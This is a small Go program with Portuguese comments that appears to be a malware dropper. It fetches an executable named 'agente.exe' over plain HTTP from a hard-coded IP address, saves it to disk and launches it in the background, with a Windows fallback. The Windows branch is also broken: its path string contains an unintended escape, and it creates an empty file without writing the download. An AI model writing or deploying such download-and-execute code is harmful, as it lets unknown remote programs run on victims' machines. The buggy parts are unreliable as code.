package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const (
	filePath  = "/home/agente.exe"
	filePath2 = "C:\agente.exe"
	url       = "http://200.98.129.32/agente.exe"
)

func executaWin() {
	cmd := exec.Command(filePath2)
	err := cmd.Start()

	if err != nil {
		fmt.Println("Erro Ao Executar no Win", err.Error())
	}

}

func Windows() {
	file, err := os.Create(filePath2)
	if err != nil {
		fmt.Println("Erro Ao Criar no Windows", err)
	}

	return
	defer file.Close()
}
func main() {

	// Faz a solicitação HTTP para obter o arquivo
	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Erro ao fazer a solicitação HTTP:", err)
		return
	}
	defer response.Body.Close()

	// Cria o arquivo local para salvar o conteúdo
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Erro ao criar no Linux:", err.Error())
		Windows()
		return
	}
	defer file.Close()

	// Copia o conteúdo da resposta HTTP para o arquivo local
	_, err = io.Copy(file, response.Body)
	if err != nil {
		fmt.Println("Erro ao salvar o arquivo:", err)
		return
	}

	// Aguarda 3 segundos
	time.Sleep(3 * time.Second)

	// Executa o arquivo baixado
	cmd := exec.Command(filePath)
	err = cmd.Start()
	if err != nil {
		fmt.Println("Erro ao executar o arquivo:", err)
		executaWin()
		return
	}
}
